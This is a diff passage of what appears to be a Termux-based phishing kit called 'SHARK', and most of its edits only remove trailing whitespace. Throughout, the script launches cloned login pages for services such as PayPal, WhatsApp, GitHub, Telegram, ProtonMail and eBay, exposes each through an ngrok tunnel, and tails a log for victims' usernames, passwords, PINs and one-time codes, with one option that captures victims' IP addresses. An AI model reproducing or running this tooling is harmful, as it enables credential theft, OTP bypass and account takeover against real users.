-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 		           echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
+                           echo
+                           tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"
 
                            break;
-			   
+
                elif [ $option = 10 ]
 	       then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd amazonsign/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
 			   echo
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "email" -e "password" -e "OTP"  
+                           echo
+                           tail -f log.txt | grep -e "email" -e "password" -e "OTP"
 
                            break;
 
@@ -613,140 +637,140 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd whatsapp-phishing/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      
+                           echo
+                           tail -f log.txt | grep -e "number" -e "OTP" -e "otp"
 
                            break;
-			   
+
 	          elif [ $option = 12 ]
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd Linkedin/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"       
+                           echo
+                           tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"
 
                            break;
-   
+
                      elif [ $option = 13 ]
 	             then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd Hotstar-otp-bypass/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-		           echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+		           echo
 		           echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "phoneNo" -e "OTP"       
+                           echo
+                           tail -f log.txt | grep -e "phoneNo" -e "OTP"
 
                            break;
-      
+
                     elif [ $option = 14 ]
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd spotify/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
-		           ash 
+		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"        
+                           echo
+                           tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"
 
                            break;
-			   
+
 	            elif [ $option = 15 ]
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd github/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
@@ -754,50 +778,50 @@ ash() {
                            ( sleep 18 ) &> /dev/null & spinner
 			   echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 	                   ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			   echo
-                           tail -f log.txt | grep -e "login" -e "password" -e "otp"       
+                           tail -f log.txt | grep -e "login" -e "password" -e "otp"
 
                            break;
-			   
+
 	        elif [ $option = 16 ]
 	        then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd ipfinder/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
              		   ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
-                           echo 
-                           tail -f ip.txt        
+                           echo
+                           tail -f ip.txt
 
                            break;
 
@@ -805,31 +829,31 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd Zomato-Phishing/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 	                   ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "email" -e "otp" -e "OTP"                
+                           echo
+                           tail -f log.txt | grep -e "email" -e "otp" -e "OTP"
 
                            break;
 
@@ -837,255 +861,255 @@ ash() {
 	           then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd phonepay/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                
+			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
           		   ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "number" -e "otp"                       
+                           echo
+                           tail -f log.txt | grep -e "number" -e "otp"
 
                            break;
-			   
+
 	            elif [ $option = 19 ]
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd paypal/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 	                   ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"    
+                           echo
+                           tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"
 
                            break;
-           
+
 	            elif [ $option = 20 ]
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd telegram/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "phone_number" -e "phone_code"     
+                           echo
+                           tail -f log.txt | grep -e "phone_number" -e "phone_code"
 
                            break;
-			   
+
 	            elif [ $option = 21 ]
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd twitter/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 	 	           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
 			   echo
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"      
+                           echo
+                           tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"
 
                            break;
-                    
+
 		    elif [ $option = 22 ]
 	            then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd flipcart/
-                          echo 
+                          echo
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
-                          echo 
+                          echo
                           (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
-                          echo 
+                          echo
 			  tput cnorm
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			  ( sleep 6 ) &> /dev/null & spinner1
 		          ash
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
-			  echo 
-			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			  echo 
+			  echo
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			  echo
 			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			  echo
-                          tail -f log.txt | grep -e "email" -e "password" -e "otp"     
+                          tail -f log.txt | grep -e "email" -e "password" -e "otp"
 
                           break;
-       
+
                   elif [ $option = 23 ]
 	          then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd wordpress/
-                          echo 
+                          echo
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
-                          echo 
+                          echo
                           (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
-                          echo 
+                          echo
 			  tput cnorm
-                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			  ( sleep 6 ) &> /dev/null & spinner1
 		          ash
 			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  shark_logo
-			  echo 
-			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			  echo 
+			  echo
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			  echo
 			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                          echo 
-                          tail -f log.txt | grep -e "log" -e "pwd"       
+                          echo
+                          tail -f log.txt | grep -e "log" -e "pwd"
 
                           break;
-			  
+
 	           elif [ $option = 24 ]
 	           then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd snapchat/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
-			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"  
-                           echo 
-                           tail -f log.txt | grep -e "username" -e "password" -e "Code"       
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
+                           echo
+                           tail -f log.txt | grep -e "username" -e "password" -e "Code"
 
                            break;
-			   
+
 		    elif [ $option = 25 ]
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd protonmail/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 	              	   ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "username" -e "password"   
+                           echo
+                           tail -f log.txt | grep -e "username" -e "password"
 
                            break;
 
@@ -1093,31 +1117,31 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd stackoverflow/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "email" -e "password"                 
+                           echo
+                           tail -f log.txt | grep -e "email" -e "password"
 
                            break;
 
@@ -1125,31 +1149,31 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd ebay/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "userid" -e "pass" -e "pin"                       
+                           echo
+                           tail -f log.txt | grep -e "userid" -e "pass" -e "pin"
 
                            break;
 
@@ -1157,145 +1181,145 @@ ash() {
 	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd twitch/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
  		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "Username" -e "password" -e "otp"  
+                           echo
